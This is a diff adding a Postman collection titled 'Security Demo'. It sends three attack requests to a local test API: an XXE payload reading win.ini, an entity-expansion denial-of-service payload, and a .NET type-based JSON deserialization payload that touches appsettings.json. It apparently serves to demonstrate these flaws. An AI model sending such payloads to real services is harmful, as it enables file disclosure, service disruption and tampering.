@@ -1,0 +1,133 @@
+{
+	"info": {
+		"_postman_id": "b60faf2e-8ed4-492a-9677-a7c4e7d26f21",
+		"name": "Security Demo",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "XXE Demo read ini",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "text/plain",
+						"type": "text"
+					},
+					{
+						"key": "Transfer-Encoding",
+						"value": "u",
+						"type": "text",
+						"disabled": true
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "<?xml version=\"1.0\"?>\r\n<!DOCTYPE foo [  <!ELEMENT foo ANY >\r\n<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\" >]>\r\n<foo>&xxe;</foo>",
+					"options": {
+						"raw": {
+							"language": "text"
+						}
+					}
+				},
+				"url": {
+					"raw": "https://localhost:44379/api/ReadXML",
+					"protocol": "https",
+					"host": [
+						"localhost"
+					],
+					"port": "44379",
+					"path": [
+						"api",
+						"ReadXML"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "XXE Demo DOS",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "text/plain",
+						"type": "text"
+					},
+					{
+						"key": "Transfer-Encoding",
+						"value": "u",
+						"type": "text",
+						"disabled": true
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "<?xml version=\"1.0\"?>\r\n<!DOCTYPE data [\r\n\t<!ENTITY a0 \"dos\" >\r\n\t<!ENTITY a1 \"&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;\">\r\n\t<!ENTITY a2 \"&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;\">\r\n\t]>\r\n<data>&a2;</data>",
+					"options": {
+						"raw": {
+							"language": "text"
+						}
+					}
+				},
+				"url": {
+					"raw": "https://localhost:44379/api/ReadXML",
+					"protocol": "https",
+					"host": [
+						"localhost"
+					],
+					"port": "44379",
+					"path": [
+						"api",
+						"ReadXML"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "JSON deserialization",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json",
+						"type": "text"
+					},
+					{
+						"key": "Transfer-Encoding",
+						"value": "u",
+						"type": "text",
+						"disabled": true
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n\t\"obj\": {\r\n\t\t\"$type\": \"System.IO.FileInfo, System.IO.FileSystem\",\r\n\t\t\"fileName\": \"appsettings.json\",\r\n\t\t\"IsReadOnly\": true\r\n\t}\r\n}",
+					"options": {
+						"raw": {
+							"language": "text"
+						}
+					}
+				},
+				"url": {
+					"raw": "https://localhost:44379/api/Deserialize",
+					"protocol": "https",
+					"host": [
+						"localhost"
+					],
+					"port": "44379",
+					"path": [
+						"api",
+						"Deserialize"
+					]
+				}
+			},
+			"response": []
+		}
+	],
+	"protocolProfileBehavior": {}
+}
